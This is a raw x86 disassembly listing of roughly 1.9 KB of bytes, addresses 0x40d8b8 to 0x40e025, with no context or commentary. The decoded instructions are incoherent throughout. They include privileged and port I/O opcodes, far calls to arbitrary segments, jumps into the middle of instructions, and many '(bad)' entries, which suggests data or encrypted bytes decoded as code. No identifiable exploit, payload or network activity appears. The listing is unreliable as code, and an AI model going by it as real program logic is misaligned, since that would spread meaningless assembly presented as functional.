  40d8b8:	adc    eax,0x982ba3bc
  40d8bd:	inc    edx
  40d8be:	sub    eax,0x8f63388d
  40d8c3:	mov    ebx,0xb5aeb800
  40d8c8:	inc    BYTE PTR [eax+eiz*2+0x27]
  40d8cc:	popf   
  40d8cd:	mov    al,0x4e
  40d8cf:	nop
  40d8d0:	int3   
  40d8d1:	mov    bl,bl
  40d8d3:	dec    esi
  40d8d4:	mov    ch,0xff
  40d8d6:	pop    es
  40d8d7:	call   DWORD PTR [ebp-0x6911a4a3]
  40d8dd:	ins    BYTE PTR es:[edi],dx
  40d8de:	sbb    eax,0xeb05cfa9
  40d8e3:	cmp    BYTE PTR [ecx+ebx*1],dh
  40d8e6:	repz mov bl,0x8d
  40d8e9:	ror    bl,cl
  40d8eb:	jns    0x40d947
  40d8ed:	jae    0x40d895
  40d8ef:	aaa    
  40d8f0:	arpl   WORD PTR [esi-0xcf93789],di
  40d8f6:	xor    edx,DWORD PTR [edx-0x46efe7c9]
  40d8fc:	xor    eax,0xcdd5135e
  40d901:	stos   BYTE PTR es:[edi],al
  40d902:	sbb    dh,ah
  40d904:	pop    ds
  40d905:	cmp    eax,0x9ff912d3
  40d90a:	js     0x40d8d9
  40d90c:	jmp    0xe5df1526
  40d911:	and    al,0x60
  40d913:	jmp    0x51cc4ff
  40d918:	sahf   
  40d919:	xor    bh,bh
  40d91b:	adc    BYTE PTR [ecx],0x70
  40d91e:	sbb    al,0x2c
  40d920:	lds    edi,FWORD PTR [ecx]
  40d922:	pop    esp
  40d923:	mov    bl,0xea
  40d925:	sub    BYTE PTR [edx],0x93
  40d928:	mov    ah,0x23
  40d92a:	add    DWORD PTR [ecx-0x79],0xffffffe6
  40d92e:	shl    DWORD PTR [eax+ecx*2],0x3e
  40d932:	cmp    BYTE PTR [ebx+ebx*1+0xb],bl
  40d936:	out    dx,al
  40d937:	adc    eax,0x41cf91e5
  40d93c:	pop    eax
  40d93d:	pop    ebp
  40d93e:	cmc    
  40d93f:	mov    dh,ch
  40d941:	fisttp DWORD PTR fs:[ebx+0x3e10216b]
  40d948:	sub    ch,ah
  40d94a:	adc    bl,BYTE PTR [edi]
  40d94c:	push   edi
  40d94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d94e:	ja     0x40d8d7
  40d950:	and    ebp,ebx
  40d952:	pop    ds
  40d953:	imul   edi,esi,0xffffffbf
  40d956:	int    0x70
  40d958:	push   0xffffffbc
  40d95a:	pop    es
  40d95b:	repnz mov bl,0xf2
  40d95e:	push   0x15
  40d960:	inc    edi
  40d961:	adc    al,0xb0
  40d963:	nop
  40d964:	add    cl,bl
  40d966:	xchg   esi,eax
  40d967:	outs   dx,DWORD PTR ds:[esi]
  40d968:	cmp    al,0xc7
  40d96a:	shr    BYTE PTR [ecx-0x30],0xb
  40d96e:	cmp    al,BYTE PTR [ebx+0x5a546f28]
  40d974:	lock inc ebx
  40d976:	popf   
  40d977:	popf   
  40d978:	inc    eax
  40d979:	pop    edx
  40d97a:	adc    ebp,esp
  40d97c:	push   edx
  40d97d:	pop    ds
  40d97e:	pop    ebp
  40d97f:	iret   
  40d980:	xor    eax,0x7924fa8b
  40d985:	dec    esi
  40d986:	popf   
  40d987:	xchg   esi,eax
  40d988:	adc    eax,0x348bbe27
  40d98d:	test   BYTE PTR [eax-0x2a6c3917],dl
  40d993:	ss pop ecx
  40d995:	das    
  40d996:	inc    edx
  40d997:	xor    al,0x47
  40d999:	inc    edi
  40d99a:	jmp    0x40d94b
  40d99c:	loopne 0x40d956
  40d99e:	or     dh,BYTE PTR [ebp-0x27]
  40d9a1:	jg     0x40d923
  40d9a3:	push   edi
  40d9a4:	mov    DWORD PTR ss:[bx+di],esp
  40d9a8:	jp     0x40d9c6
  40d9aa:	mov    BYTE PTR [esi],dh
  40d9ac:	sub    ebx,DWORD PTR [eax]
  40d9ae:	pop    edi
  40d9af:	call   0x72b5062d
  40d9b4:	pop    edi
  40d9b5:	cld    
  40d9b6:	xchg   esp,eax
  40d9b7:	bound  eax,QWORD PTR [ebx]
  40d9b9:	jle    0x40d9c0
  40d9bb:	or     BYTE PTR [eax+ebp*2-0x56],0x26
  40d9c0:	add    bl,BYTE PTR [esi]
  40d9c2:	push   ecx
  40d9c3:	dec    ebp
  40d9c4:	xchg   bl,ch
  40d9c6:	fs push edx
  40d9c8:	hlt    
  40d9c9:	fs jge 0x40da09
  40d9cc:	or     BYTE PTR [edi+edx*4+0x5bca591c],bh
  40d9d3:	push   0x21
  40d9d5:	retf   
  40d9d6:	sbb    al,0xf
  40d9d8:	cld    
  40d9d9:	test   DWORD PTR [ecx+eax*4+0xd70d152],ebx
  40d9e0:	push   ebp
  40d9e1:	pop    edi
  40d9e2:	cmp    DWORD PTR [edx-0x272e60fb],edx
  40d9e8:	dec    edx
  40d9e9:	inc    edx
  40d9ea:	nop
  40d9eb:	or     DWORD PTR [ecx],ebp
  40d9ed:	jnp    0x40d9e3
  40d9ef:	dec    ebp
  40d9f0:	dec    ebp
  40d9f1:	jnp    0x40d9a2
  40d9f3:	cmp    eax,DWORD PTR [ebp+0x22b0cac3]
  40d9f9:	rcl    DWORD PTR [edi+edi*1+0x48d1f6c8],cl
  40da00:	retf   0xe4e1
  40da03:	xor    BYTE PTR [ebp+0x5e7c5b72],ch
  40da09:	add    cl,BYTE PTR ds:0x30c7fd1c
  40da0f:	call   ecx
  40da11:	add    dh,bl
  40da13:	pop    edx
  40da14:	fs pop edx
  40da16:	push   edi
  40da17:	mov    dl,0xc0
  40da19:	push   0x54855e67
  40da1e:	mov    fs,WORD PTR [ecx+0x62fef157]
  40da24:	cmp    DWORD PTR [ebp+edx*8+0x5],ecx
  40da28:	push   eax
  40da29:	les    ecx,FWORD PTR [edi+esi*4]
  40da2c:	in     eax,dx
  40da2d:	ror    BYTE PTR [edx],1
  40da2f:	daa    
  40da30:	fwait
  40da31:	mov    gs,WORD PTR [edx]
  40da33:	repnz mov ebp,0x8beb8432
  40da39:	jns    0x40da77
  40da3b:	sbb    DWORD PTR [esp+eax*4-0x6f],ecx
  40da3f:	dec    esp
  40da40:	shr    ebp,1
  40da42:	scas   eax,DWORD PTR es:[edi]
  40da43:	pop    ebx
  40da44:	aas    
  40da45:	gs pop ss
  40da47:	test   al,0x16
  40da49:	pop    edx
  40da4a:	out    dx,eax
  40da4b:	add    eax,0xf833f50d
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0xf9,eax
  40da6e:	adc    DWORD PTR [edi+0x7ea23240],ebx
  40da74:	jle    0x40dae6
  40da76:	jns    0x40daf6
  40da78:	jle    0x40dab1
  40da7a:	sbb    BYTE PTR [eax],bh
  40da7c:	scas   al,BYTE PTR es:[edi]
  40da7d:	sub    BYTE PTR [ecx+ebp*1],0x3e
  40da81:	cdq    
  40da82:	lods   eax,DWORD PTR ds:[esi]
  40da83:	out    dx,eax
  40da84:	in     eax,0x5f
  40da86:	shl    eax,cl
  40da88:	mov    ebp,esp
  40da8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da8b:	adc    edi,edi
  40da8d:	xchg   ebp,eax
  40da8e:	inc    ebx
  40da8f:	cmp    eax,0x6fec447c
  40da94:	mov    dh,0xfa
  40da96:	pushf  
  40da97:	xor    ah,BYTE PTR [eax-0x6b6360b6]
  40da9d:	fld    DWORD PTR [eax+0x2e]
  40daa0:	inc    ebp
  40daa1:	mov    eax,0x273dfaef
  40daa6:	stc    
  40daa7:	(bad)  
  40daa8:	mov    edi,0x1836b646
  40daad:	inc    esi
  40daae:	ins    DWORD PTR es:[edi],dx
  40daaf:	lods   eax,DWORD PTR ds:[esi]
  40dab0:	cmp    esi,DWORD PTR [ebx+0x12]
  40dab3:	pop    esi
  40dab4:	mov    dh,0x97
  40dab6:	jns    0x40da51
  40dab8:	stc    
  40dab9:	dec    eax
  40daba:	mov    ebx,DWORD PTR fs:[edx-0x71802b7e]
  40dac1:	jmp    0xc2035975
  40dac6:	ret    0xf73c
  40dac9:	iret   
  40daca:	xlat   BYTE PTR ds:[ebx]
  40dacb:	fst    st(6)
  40dacd:	fs iret 
  40dacf:	dec    esp
  40dad0:	loop   0x40da5c
  40dad2:	pop    es
  40dad3:	bound  ebx,QWORD PTR [ecx-0x55a6602c]
  40dad9:	push   es
  40dada:	push   0x9d4afa49
  40dadf:	out    0xe3,eax
  40dae1:	push   es
  40dae2:	pop    ebx
  40dae3:	jb     0x40da99
  40dae5:	(bad)  
  40dae6:	xor    al,0x94
  40dae8:	inc    edx
  40dae9:	in     eax,0xa2
  40daeb:	push   ss
  40daec:	push   esp
  40daed:	mov    DWORD PTR [ebx+0x2cdb69ef],edi
  40daf3:	xchg   edi,eax
  40daf4:	mul    DWORD PTR [esi-0x75402d4e]
  40dafa:	cmc    
  40dafb:	(bad)  
  40dafc:	int    0xab
  40dafe:	lahf   
  40daff:	out    dx,al
  40db00:	jmp    0x40db2f
  40db02:	mov    bh,BYTE PTR [eax+0x77948973]
  40db08:	push   ss
  40db09:	mov    ?,esi
  40db0b:	bound  ebx,QWORD PTR [edx+0x2c]
  40db0e:	jmp    0xd473:0xbfad7816
  40db15:	aad    0xe1
  40db17:	mov    eax,ds:0x48f7d25a
  40db1c:	scas   eax,DWORD PTR es:[edi]
  40db1d:	ret    
  40db1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db1f:	cli    
  40db20:	lods   al,BYTE PTR ds:[esi]
  40db21:	sub    eax,0x612d18e4
  40db26:	ret    
  40db27:	sbb    esp,esp
  40db29:	sub    al,0xfc
  40db2b:	and    BYTE PTR [ecx+0x43b6eaf0],al
  40db31:	mov    dl,0x4
  40db33:	mov    DWORD PTR [edx-0x50b80a7f],eax
  40db39:	jmp    0xb1408089
  40db3e:	vcmpunord_ssd xmm5,xmm2,QWORD PTR [edi-0x4b]
  40db44:	not    eax
  40db46:	retf   0xcff6
  40db49:	xchg   DWORD PTR [eax+0x61],esp
  40db4c:	inc    eax
  40db4d:	pop    esi
  40db4e:	enter  0x52b2,0x1
  40db52:	sbb    esp,eax
  40db54:	dec    edx
  40db55:	(bad)  
  40db56:	mov    esi,0x60db44c0
  40db5b:	aaa    
  40db5c:	scas   al,BYTE PTR es:[edi]
  40db5d:	cs dec ebx
  40db5f:	sbb    BYTE PTR [edx+edx*1-0x45],dl
  40db63:	les    ebp,FWORD PTR [esi]
  40db65:	dec    bp
  40db67:	xchg   ebp,eax
  40db68:	addr16 call 0x870b:0x5267f387
  40db70:	(bad)  
  40db71:	in     eax,0xb1
  40db73:	in     al,0xca
  40db75:	mov    al,ds:0xb3beb533
  40db7a:	pop    edx
  40db7b:	mov    cl,0x99
  40db7d:	daa    
  40db7e:	loope  0x40dba0
  40db80:	pop    ecx
  40db81:	out    0x95,al
  40db83:	dec    edx
  40db84:	mov    dh,0x7d
  40db86:	sbb    al,BYTE PTR [edx+0x7e]
  40db89:	pop    edx
  40db8a:	(bad)  
  40db8b:	xchg   ecx,eax
  40db8c:	mov    eax,0x606a9f08
  40db91:	jbe    0x40db50
  40db93:	push   0x50
  40db95:	xchg   ecx,eax
  40db96:	or     al,0xe1
  40db98:	mov    cs,WORD PTR [ebx+0x42]
  40db9b:	pop    edx
  40db9c:	rcr    BYTE PTR [edx],cl
  40db9e:	mov    BYTE PTR [ecx-0x16cbc367],dh
  40dba4:	and    al,0x6c
  40dba6:	sbb    DWORD PTR [esi+0x5],esi
  40dba9:	jmp    0x40dbaf
  40dbab:	pop    ebp
  40dbac:	push   edx
  40dbad:	rcl    BYTE PTR [edx],1
  40dbaf:	sub    al,0x14
  40dbb1:	xchg   edi,eax
  40dbb2:	xchg   edi,eax
  40dbb3:	pop    edi
  40dbb4:	out    dx,al
  40dbb5:	dec    ecx
  40dbb6:	fist   WORD PTR [ecx+ecx*4]
  40dbb9:	pop    ebx
  40dbba:	sbb    BYTE PTR [ebx+eiz*1+0x52],0x73
  40dbbf:	data16 mov ah,0xf
  40dbc2:	out    dx,al
  40dbc3:	ja     0x40dbbf
  40dbc5:	idiv   DWORD PTR [eax+0x213a371b]
  40dbcb:	nop
  40dbcc:	push   cs
  40dbcd:	imul   ebp,DWORD PTR [ebp+0x70],0xa8c6a66e
  40dbd4:	adc    dl,BYTE PTR [edi]
  40dbd6:	push   es
  40dbd7:	scas   eax,DWORD PTR es:[edi]
  40dbd8:	jnp    0x40dbdc
  40dbda:	jle    0x40dc3d
  40dbdc:	mov    BYTE PTR [ebp+0x21],dh
  40dbdf:	retf   0x8066
  40dbe2:	aad    0x81
  40dbe4:	shr    al,cl
  40dbe6:	mov    ebp,0xf6c88e26
  40dbeb:	ret    
  40dbec:	adc    eax,0xc12c6a4b
  40dbf1:	dec    esp
  40dbf2:	icebp  
  40dbf3:	adc    edi,edi
  40dbf5:	jge    0x40db7c
  40dbf7:	mov    al,ds:0x19841019
  40dbfc:	sbb    bl,ah
  40dbfe:	xor    al,BYTE PTR ds:0x9cdf2b64
  40dc04:	pusha  
  40dc05:	sti    
  40dc06:	sbb    edi,DWORD PTR ds:0xc718b407
  40dc0c:	std    
  40dc0d:	dec    edx
  40dc0e:	out    0x37,eax
  40dc10:	or     al,0xb3
  40dc12:	adc    al,ah
  40dc14:	lds    esi,FWORD PTR [ebx]
  40dc16:	outs   dx,BYTE PTR ds:[esi]
  40dc17:	cmc    
  40dc18:	and    cl,BYTE PTR [eax+0x4b]
  40dc1b:	jnp    0x40dc69
  40dc1d:	or     BYTE PTR [esi+0x51],al
  40dc20:	adc    eax,0x6a10e2c4
  40dc25:	ja     0x40dbee
  40dc27:	dec    esi
  40dc28:	imul   edx,DWORD PTR [ebx+eiz*4],0x81ab5f60
  40dc2f:	mov    dl,0x82
  40dc31:	aaa    
  40dc32:	pop    edx
  40dc33:	jns    0x40dbdf
  40dc35:	adc    eax,0x27b0f35b
  40dc3a:	addr16 inc eax
  40dc3c:	imul   edx,DWORD PTR [esi],0x50
  40dc3f:	mov    dh,0x8f
  40dc41:	mov    cs,WORD PTR [ebp-0x3]
  40dc44:	mov    ss,WORD PTR [eiz*2-0x5c05b690]
  40dc4b:	mov    al,ds:0xaf88b169
  40dc50:	pop    esi
  40dc51:	hlt    
  40dc52:	mov    esp,0xfc1914d9
  40dc57:	jmp    0x40dc4a
  40dc59:	es jecxz 0x40dc2d
  40dc5c:	pop    esi
  40dc5d:	inc    esp
  40dc5e:	aaa    
  40dc5f:	lds    esi,FWORD PTR [eax]
  40dc61:	aaa    
  40dc62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc63:	jns    0x40dc92
  40dc65:	outs   dx,BYTE PTR ds:[esi]
  40dc66:	fstp   DWORD PTR [edi-0x2924e801]
  40dc6c:	jbe    0x40dcd4
  40dc6e:	rcr    DWORD PTR [eax+0x73563151],1
  40dc74:	xor    eax,0xca0806fa
  40dc79:	push   0x44
  40dc7b:	mov    eax,ds:0xe6b4477a
  40dc80:	adc    BYTE PTR [edx],ah
  40dc82:	cmp    al,0x65
  40dc84:	push   0x6
  40dc86:	pop    es
  40dc87:	mov    al,0x1c
  40dc89:	mov    eax,ds:0x916fb617
  40dc8e:	xlat   BYTE PTR ds:[ebx]
  40dc8f:	xchg   esi,eax
  40dc90:	lods   al,BYTE PTR ds:[esi]
  40dc91:	cmp    ecx,0x5d
  40dc94:	jg     0x40dcf4
  40dc96:	jp     0x40dcd3
  40dc98:	inc    ebx
  40dc99:	push   DWORD PTR [edx]
  40dc9b:	xchg   edx,eax
  40dc9c:	sub    eax,0x4343c82e
  40dca1:	fcomip st,st(4)
  40dca3:	mov    BYTE PTR [edx+ebp*8+0x1b],bl
  40dca7:	das    
  40dca8:	xchg   esp,eax
  40dca9:	ja     0x40dc51
  40dcab:	ins    DWORD PTR es:[edi],dx
  40dcac:	rcr    DWORD PTR [edx],1
  40dcae:	pop    esi
  40dcaf:	mov    ch,0x1c
  40dcb1:	fwait
  40dcb2:	sub    BYTE PTR [edi],0x33
  40dcb5:	adc    DWORD PTR [ebx+0x70f64dc6],0xffffffde
  40dcbc:	test   BYTE PTR [esi+0x653b3a08],cl
  40dcc2:	inc    ebx
  40dcc3:	clc    
  40dcc4:	fs daa 
  40dcc6:	mov    ds:0xe0dbc30b,eax
  40dccb:	mov    ds:0xf3c4c3b0,al
  40dcd0:	pop    ebx
  40dcd1:	mov    BYTE PTR [ecx+0x79],0x8
  40dcd5:	rol    DWORD PTR ds:0x80618af4,1
  40dcdb:	adc    esp,edi
  40dcdd:	or     dl,al
  40dcdf:	dec    ecx
  40dce0:	xchg   esi,eax
  40dce1:	repz sbb ch,BYTE PTR [ebx+esi*1+0x44]
  40dce6:	jmp    0xa0c835b1
  40dceb:	push   esp
  40dcec:	retf   
  40dced:	fstp   DWORD PTR [edi]
  40dcef:	jae    0x40dcc9
  40dcf1:	xchg   esi,eax
  40dcf2:	mov    eax,0xa14642f4
  40dcf7:	push   ecx
  40dcf8:	adc    cl,BYTE PTR [eax-0x675610e0]
  40dcfe:	mov    esp,0xafa26fc2
  40dd03:	adc    eax,0xeb0893b5
  40dd08:	push   esp
  40dd09:	stos   BYTE PTR es:[edi],al
  40dd0a:	xor    edi,DWORD PTR [ebx+0xe]
  40dd0d:	es sbb al,0x99
  40dd10:	add    eax,0x7e516d2c
  40dd15:	into   
  40dd16:	mov    eax,0x5578f838
  40dd1b:	nop
  40dd1c:	call   0xd4a2:0x18698259
  40dd23:	sbb    BYTE PTR [edi],0xdc
  40dd26:	sub    ah,BYTE PTR [ebx+0x750bc13f]
  40dd2c:	inc    edi
  40dd2d:	pusha  
  40dd2e:	retf   
  40dd2f:	dec    ebp
  40dd30:	pop    ecx
  40dd31:	nop
  40dd32:	inc    ecx
  40dd33:	mov    DWORD PTR [ebx+0xc],ebx
  40dd36:	dec    eax
  40dd37:	and    bl,bl
  40dd39:	lods   eax,DWORD PTR ds:[esi]
  40dd3a:	scas   al,BYTE PTR es:[edi]
  40dd3b:	cmp    al,0xc8
  40dd3d:	jl     0x40ddb0
  40dd3f:	adc    al,0x18
  40dd41:	je     0x40dd30
  40dd43:	inc    esi
  40dd44:	mov    al,ds:0xeda9e67a
  40dd49:	pop    eax
  40dd4a:	in     eax,0xf2
  40dd4c:	not    BYTE PTR [ebp-0x47ad99a5]
  40dd52:	mov    ebx,0x6a132abc
  40dd57:	add    DWORD PTR [esi],ebx
  40dd59:	in     al,dx
  40dd5a:	ins    BYTE PTR es:[edi],dx
  40dd5b:	(bad)
  40dd5e:	cmp    BYTE PTR [ebp-0x450a71fa],ch
  40dd64:	out    dx,al
  40dd65:	scas   eax,DWORD PTR es:[edi]
  40dd66:	mov    esp,0x80c1f507
  40dd6b:	pop    ds
  40dd6c:	call   0xe16c:0x528ff0a
  40dd73:	mov    edi,0x9369be90
  40dd78:	out    0xed,al
  40dd7a:	jae    0x40dd41
  40dd7c:	or     ah,ch
  40dd7e:	push   0xfffffff5
  40dd80:	jmp    0xd67156ad
  40dd85:	inc    esi
  40dd86:	sar    BYTE PTR [ecx-0x16],0xe9
  40dd8a:	push   edx
  40dd8b:	cmp    esi,eax
  40dd8d:	adc    edi,DWORD PTR [edx-0x2a]
  40dd90:	push   cs
  40dd91:	jmp    0x40dd4a
  40dd93:	(bad)  [ecx+0x67]
  40dd96:	jle    0x40de14
  40dd98:	jl     0x40ddae
  40dd9a:	lock xor dl,BYTE PTR [eax+0x75]
  40dd9e:	daa    
  40dd9f:	cmp    eax,0x37a865ac
  40dda4:	test   BYTE PTR [eax],bl
  40dda6:	in     eax,dx
  40dda7:	scas   eax,DWORD PTR es:[edi]
  40dda8:	xchg   BYTE PTR [edx],ah
  40ddaa:	out    dx,al
  40ddab:	imul   ebp,DWORD PTR [edx],0x948c624d
  40ddb1:	push   ecx
  40ddb2:	lock jno 0x40dd6b
  40ddb5:	xor    BYTE PTR [eax+0xda8a1ac],ah
  40ddbb:	(bad)  
  40ddbc:	sbb    cl,BYTE PTR [ebp-0x44f831da]
  40ddc2:	push   es
  40ddc3:	or     edi,DWORD PTR [ebp-0x2]
  40ddc6:	mov    eax,0xe877d17c
  40ddcb:	cmp    al,0x38
  40ddcd:	mov    dh,BYTE PTR [eax]
  40ddcf:	js     0x40de38
  40ddd1:	push   ecx
  40ddd2:	(bad)  
  40ddd4:	aam    0x54
  40ddd6:	or     al,0xe2
  40ddd9:	rcr    DWORD PTR [esi+0x73],cl
  40dddc:	cli    
  40dddd:	add    dh,BYTE PTR [edi]
  40dddf:	shr    DWORD PTR [edx],0x19
  40dde2:	lods   al,BYTE PTR ds:[esi]
  40dde3:	into   
  40dde4:	push   ebx
  40dde5:	inc    esp
  40dde6:	cmp    DWORD PTR [ebx-0x66],ecx
  40dde9:	pushf  
  40ddea:	ret    
  40ddeb:	cmp    DWORD PTR [ebp-0x2fa1a795],0x4d
  40ddf2:	cmp    DWORD PTR [ecx+0x1743f8a4],eax
  40ddf8:	cmc    
  40ddf9:	jne    0x40dd7f
  40ddfb:	mov    ebx,0xdfe78c98
  40de00:	in     eax,dx
  40de01:	mov    bl,0x28
  40de03:	dec    esi
  40de04:	test   eax,0xabb9685f
  40de09:	or     DWORD PTR [eax-0x152fd403],esi
  40de0f:	leave  
  40de10:	fstp   QWORD PTR [ebp-0x42]
  40de13:	loop   0x40dd99
  40de15:	jg     0x40ddb1
  40de17:	ins    DWORD PTR es:[edi],dx
  40de18:	add    al,BYTE PTR [eax+ebx*1]
  40de1b:	sbb    DWORD PTR [esi-0x2fffcaec],0x65
  40de22:	(bad)  
  40de23:	aam    0xff
  40de25:	jae    0x40de2b
  40de27:	sbb    al,0x4c
  40de29:	pop    edx
  40de2a:	fwait
  40de2b:	mov    ch,0x2b
  40de2d:	loopne 0x40de9a
  40de2f:	adc    eax,DWORD PTR fs:[ecx]
  40de32:	rcl    ch,0x70
  40de35:	fwait
  40de36:	pushf  
  40de37:	mov    ch,0x98
  40de39:	rcr    BYTE PTR [edx-0x374398e8],cl
  40de3f:	retf   0xbe0b
  40de42:	outs   dx,BYTE PTR ds:[esi]
  40de43:	mov    ch,0xf5
  40de45:	lods   al,BYTE PTR ds:[esi]
  40de46:	or     eax,0x8277ce70
  40de4b:	dec    ebx
  40de4c:	iret   
  40de4d:	ret    0x3e5b
  40de50:	test   eax,0x7d818f23
  40de55:	scas   eax,DWORD PTR es:[edi]
  40de56:	mov    ch,0x42
  40de58:	jo     0x40de94
  40de5a:	imul   ecx,DWORD PTR [esi+0x35],0x15
  40de5e:	jne    0x40de25
  40de60:	fcom   DWORD PTR [eax-0x4b]
  40de63:	sub    BYTE PTR [edi-0x73],ch
  40de66:	and    al,0xd
  40de68:	retf   0x5f3f
  40de6b:	pop    ds
  40de6c:	loopne 0x40de4e
  40de6e:	push   cs
  40de6f:	hlt    
  40de70:	js     0x40de8a
  40de72:	sub    BYTE PTR [ecx+0x558bf855],cl
  40de78:	loopne 0x40dead
  40de7a:	sar    BYTE PTR [edi-0x327299],1
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	into   
  40de92:	add    cl,BYTE PTR [ecx+ebx*8+0x34]
  40de96:	scas   al,BYTE PTR es:[edi]
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	rol    BYTE PTR [esi+0x706fc2af],0x7d
  40dea4:	dec    esp
  40dea5:	mov    ds:0x84000a2a,al
  40deaa:	xchg   ebx,eax
  40deab:	or     eax,0x10d15762
  40deb0:	xchg   ebx,eax
  40deb1:	adc    DWORD PTR [ecx-0x7184699c],0xac3cb875
  40debb:	(bad)  
  40debc:	test   al,0x6b
  40debe:	cmp    al,0x69
  40dec0:	jmp    0x40de79
  40dec2:	mov    dl,0x3
  40dec4:	or     al,0x3a
  40dec6:	out    0xc1,eax
  40dec8:	call   0x192030fa
  40decd:	popa   
  40dece:	add    al,BYTE PTR [edi+0x72e3018]
  40ded4:	pop    eax
  40ded5:	jge    0x40df32
  40ded7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded8:	mov    DWORD PTR [edi+0x54],eax
  40dedb:	loop   0x40df0b
  40dedd:	mov    dl,0x42
  40dedf:	adc    al,BYTE PTR [ebx-0x8]
  40dee2:	imul   edi,DWORD PTR [esi],0x90427958
  40dee8:	mov    ebp,0xb53d826b
  40deed:	inc    edi
  40deee:	ficom  DWORD PTR [ebp+0x36]
  40def1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40def2:	repnz sbb edx,esi
  40def5:	popf   
  40def6:	(bad)  
  40def7:	mov    al,0x52
  40def9:	xchg   BYTE PTR [edi-0xd3e7819],dh
  40deff:	jp     0x40deac
  40df01:	ins    BYTE PTR es:[edi],dx
  40df02:	mov    dh,0xe5
  40df04:	popa   
  40df05:	adc    eax,0x49ef0247
  40df0a:	mov    BYTE PTR [esi-0x73],ah
  40df0d:	rcr    BYTE PTR [ebp+0x4d5fca60],cl
  40df13:	ficom  WORD PTR [esp+esi*8]
  40df16:	and    eax,0xb15c97f1
  40df1b:	pop    edi
  40df1c:	adc    al,0x2c
  40df1e:	jne    0x40df82
  40df20:	dec    ecx
  40df21:	ret    0x718f
  40df24:	loope  0x40deaf
  40df26:	sub    eax,esp
  40df28:	out    dx,eax
  40df29:	adc    al,0xb2
  40df2b:	scas   eax,DWORD PTR es:[edi]
  40df2c:	ds jl  0x40deea
  40df2f:	std    
  40df30:	mov    edi,0xfd96f241
  40df35:	mov    esi,esp
  40df37:	inc    ebx
  40df38:	push   edx
  40df39:	je     0x40df5a
  40df3b:	out    0xe1,al
  40df3d:	push   ds
  40df3e:	sub    DWORD PTR [edx+edx*4+0x75e8618],ebp
  40df45:	pop    ebx
  40df46:	pop    ebp
  40df47:	xchg   cx,ax
  40df49:	(bad)  
  40df4a:	mov    ebp,0xe5ce2911
  40df4f:	lods   eax,DWORD PTR ds:[esi]
  40df50:	aad    0xc9
  40df52:	icebp  
  40df53:	stos   DWORD PTR es:[edi],eax
  40df54:	mov    ebx,0x6c802a6
  40df59:	push   esi
  40df5a:	inc    ebx
  40df5b:	hlt    
  40df5c:	dec    ebp
  40df5d:	cmp    al,BYTE PTR [ebp+0x30]
  40df60:	out    0xf4,al
  40df62:	hlt    
  40df63:	xchg   esp,eax
  40df64:	cmc    
  40df65:	dec    esi
  40df66:	lods   eax,DWORD PTR ds:[esi]
  40df67:	add    DWORD PTR [edx+eax*2],eax
  40df6a:	aas    
  40df6b:	mov    ebx,esi
  40df6d:	mov    BYTE PTR [ebx-0x4b],dh
  40df70:	loopne 0x40df17
  40df72:	jo     0x40df85
  40df74:	mov    edi,edx
  40df76:	xlat   BYTE PTR ds:[ebx]
  40df77:	adc    edi,DWORD PTR [esi]
  40df79:	adc    ecx,0x6f2b5908
  40df7f:	inc    esp
  40df80:	bswap  ecx
  40df82:	clc    
  40df83:	jecxz  0x40dfa9
  40df85:	inc    ebx
  40df86:	xchg   dh,dh
  40df88:	xor    ah,BYTE PTR [ecx+0x61b19254]
  40df8e:	xor    BYTE PTR [ecx],bh
  40df90:	outs   dx,DWORD PTR ds:[esi]
  40df91:	lahf   
  40df92:	lock dec ecx
  40df94:	clc    
  40df95:	add    ebp,DWORD PTR [ebp-0xda9417a]
  40df9b:	cmp    eax,0xc61d1b51
  40dfa0:	mov    esp,0xfc083427
  40dfa5:	imul   esi,DWORD PTR [esi+0x7b],0x306664e1
  40dfac:	jle    0x40df6e
  40dfae:	sub    DWORD PTR [edi],ebx
  40dfb0:	cmp    ebp,DWORD PTR [esi+0x4f]
  40dfb3:	ret    0xc9e0
  40dfb6:	jecxz  0x40dfa6
  40dfb8:	xlat   BYTE PTR ds:[ebx]
  40dfb9:	add    DWORD PTR [ebp-0x6b4d495],eax
  40dfbf:	mov    dl,0x96
  40dfc1:	or     BYTE PTR [edi+eiz*4+0x4e9fd191],bl
  40dfc8:	sub    DWORD PTR [ecx],ebx
  40dfca:	enter  0xc58a,0x80
  40dfce:	icebp  
  40dfcf:	xor    al,0x48
  40dfd1:	and    al,0x98
  40dfd4:	push   0x5a880516
  40dfd9:	test   eax,0x60346597
  40dfde:	jmp    FWORD PTR ss:[ebx+0x2c7b4e81]
  40dfe5:	je     0x40df78
  40dfe7:	jne    0x40dfd7
  40dfe9:	jg     0x40dfd5
  40dfeb:	push   esp
  40dfec:	sub    dl,0xa5
  40dfef:	loope  0x40e01e
  40dff1:	bound  ebx,QWORD PTR [eax]
  40dff3:	jbe    0x40e029
  40dff5:	dec    esp
  40dff6:	ret    0x5af9
  40dff9:	pop    ebx
  40dffa:	mov    dh,0x53
  40dffc:	and    edi,DWORD PTR [ebx-0x5f]
  40dfff:	ror    BYTE PTR [esi-0x54],cl
  40e002:	loopne 0x40dfa7
  40e004:	aam    0x2
  40e006:	pop    edi
  40e007:	ds cmp al,0xa2
  40e00a:	ja     0x40e08b
  40e00c:	jge    0x40e07f
  40e00e:	xor    ch,cl
  40e010:	dec    esp
  40e011:	inc    esi
  40e012:	sbb    DWORD PTR [edi-0x17],ebx
  40e015:	jne    0x40e033
  40e017:	or     bh,bl
  40e019:	or     eax,0x25fbc76
  40e01e:	mov    cl,0x7a
  40e020:	sub    al,0x86
  40e022:	leave  
  40e023:	rcl    cl,cl
  40e025:	dec    ebp
